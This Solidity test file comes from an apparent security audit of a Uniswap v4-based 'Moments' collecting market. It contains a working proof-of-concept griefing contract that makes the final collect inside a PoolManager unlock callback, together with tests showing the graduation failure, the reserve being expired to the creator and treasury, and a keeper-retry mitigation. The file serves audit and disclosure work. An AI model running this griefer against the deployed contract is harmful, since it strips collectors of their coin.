// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {MomentsMarketBase} from "../moments/MomentsMarketBase.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {MockUSDC} from "../moments/mocks/MockUSDC.sol";
import {MomentTypes} from "../../src/moments/interfaces/IMoments.sol";
import {MomentCollect} from "../../src/moments/MomentCollect.sol";
import {V1MomentLocker} from "./V1MomentLocker.sol";

/// Security audit 2026-09-26, MO-1 (proof of concept against the real v4 PoolManager; deployed bytecode unchanged).
///
/// This PoC runs against the DEPLOYED (v1) MomentLocker (test/audit/V1MomentLocker.sol, a verbatim copy), because
/// the v2 source in src/ fixes the bug: see Z_MomentsUnlockGriefFixed.t.sol for the same attack against v2.
///
/// The terminal collect runs graduation inside a try/catch. If that collect is made from inside a
/// `PoolManager.unlock()` callback, graduation's `MomentLocker.seed` calls `unlock()` again, which reverts
/// `AlreadyUnlocked`; the catch swallows it, marks the Moment GraduationPending and starts the 7-day stuck clock.
/// Anyone can retry `graduate(id)` at no cost (the keeper mitigation below); if nobody does before
/// max(deadline, stuckSince + 7 days), anyone can `expire(id)` and the reserve winds down 70/30 to creator/treasury,
/// while collectors get no coin. Mitigation without a redeploy: a keeper that retries graduation for every
/// GraduationPending Moment, on every cohort, and alerts on GraduationFailed.
contract UnlockGriefer is IUnlockCallback, IERC721Receiver {
    IPoolManager internal immutable manager;
    MomentCollect internal immutable collect;
    uint256 internal target;

    constructor(IPoolManager _manager, MomentCollect _collect, MockUSDC usdc) {
        manager = _manager;
        collect = _collect;
        usdc.approve(address(_collect), type(uint256).max);
    }

    function attack(uint256 id) external {
        target = id;
        manager.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(manager), "only the manager");
        collect.collect(target, 1); // the terminal collect, made while the PoolManager is unlocked
        return "";
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract Z_MomentsUnlockGriefTest is MomentsMarketBase {
    UnlockGriefer internal griefer;

    /// The deployed (v1) locker in place of the v2 one; everything else is the normal market stack.
    function _deployMarket() internal override returns (address grad, address lockerAddr, address hookAddr, address buybackAddr) {
        (grad, lockerAddr, hookAddr, buybackAddr) = super._deployMarket();
        lockerAddr = address(new V1MomentLocker(manager, factory));
    }

    function setUp() public override {
        super.setUp();
        griefer = new UnlockGriefer(manager, collect, usdc);
        usdc.mint(address(griefer), 100_000_000);
    }

    /// 13 honest $1 collects, then the 14th (terminal) one from inside an unlock callback.
    function _griefedMoment() internal returns (uint256 id) {
        (id,,) = _publishOrdered(creator, PRICE, MAX_ALLOC_BPS, true);
        for (uint256 i = 0; i < 13; i++) _collect(id, alice, 1);
        assertEq(uint8(_state(id)), uint8(MomentTypes.State.Collecting));
        griefer.attack(id);
    }

    function test_terminalCollectInsideUnlock_leavesGraduationPending() public {
        uint256 id = _griefedMoment();
        MomentCollect.Ledger memory l = collect.ledger(id);
        assertEq(uint8(l.state), uint8(MomentTypes.State.GraduationPending), "graduation failed silently");
        assertEq(l.stuckSince, block.timestamp, "the 7-day stuck clock started");
        assertEq(l.reserve, THRESHOLD, "the full reserve sits waiting");
    }

    function test_unretried_griefedMoment_expiresToCreatorAndTreasury() public {
        uint256 id = _griefedMoment();
        (bool ok,) = address(collect).call(abi.encodeCall(MomentCollect.expire, (id)));
        assertFalse(ok, "not expirable before the grace period and the deadline");
        vm.warp(block.timestamp + WINDOW + MomentTypes.STUCK_GRACE + 1);
        uint256 creatorBefore = collect.ledger(id).creatorClaimable; // its 20% of every collect, already booked
        vm.prank(carol); // anyone
        collect.expire(id);
        MomentCollect.Ledger memory l = collect.ledger(id);
        assertEq(uint8(l.state), uint8(MomentTypes.State.Expired), "wound down instead of graduating");
        assertEq(l.creatorClaimable - creatorBefore, THRESHOLD * EXPIRY_CREATOR_BPS / BPS, "70% of the reserve to the creator");
        assertEq(l.treasuryClaimable, THRESHOLD - THRESHOLD * EXPIRY_CREATOR_BPS / BPS, "30% of the reserve to the treasury");
    }

    function test_keeperRetry_graduates() public {
        uint256 id = _griefedMoment();
        vm.prank(carol); // anyone, outside any unlock
        executor.graduate(id);
        assertEq(uint8(_state(id)), uint8(MomentTypes.State.Graduated), "a plain retry graduates it");
    }
}
